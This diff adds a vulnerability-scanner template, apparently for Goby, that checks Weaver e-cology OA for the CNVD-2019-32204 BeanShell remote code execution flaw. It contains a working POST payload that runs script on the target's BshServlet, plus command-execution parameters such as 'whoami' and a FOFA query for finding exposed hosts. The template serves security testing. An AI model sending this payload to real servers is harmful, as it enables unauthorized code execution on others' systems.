@@ -1,0 +1,81 @@
+{
+  "Name": "Weaver e-cology OA RCE (CNVD-2019-32204)",
+  "Description": "Weaver e-cology OA system has remote code execution vulnerabilities. The vulnerability exists in the BeanShell component of the OA system of the Weaver Cooperative Management Application Platform, which is built in the system and allows unauthorized access. The attacker can directly execute arbitrary commands on the target server by calling the problem interface of the BeanShell component.",
+  "Product": "Weaver-OA",
+  "Homepage": "http://www.weaver.com.cn/",
+  "DisclosureDate": "2019-09-20",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Weaver-OA\"",
+  "Level": "3",
+  "Impact": "Attackers exploit this vulnerability to cause remote code execution.",
+  "Recommendation": "Officials have released a patch for this vulnerability, and affected users can also take the following protective measures to temporarily protect this vulnerability.",
+  "References": [
+    "https://www.cnvd.org.cn/flaw/show/CNVD-2019-32204",
+    "https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204",
+    "https://xz.aliyun.com/t/6418",
+    "https://xz.aliyun.com/t/6560"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "AttackType",
+      "type": "select",
+      "value": "cmd,goby_powershell"
+    },{
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami",
+      "show": "AttackType=cmd"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "bsh.script=import+org.apache.commons.codec.digest.DigestUtils%3Bprint%28DigestUtils.md5Hex%28%22Weaver%22%29%29%0D%0A",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "method": "POST",
+        "uri": "/weaver/bsh.servlet.BshServlet"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "410f8051a15a4c16e5cdfccb9dbf547b",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["rce", "unauthorized"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Weaver-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
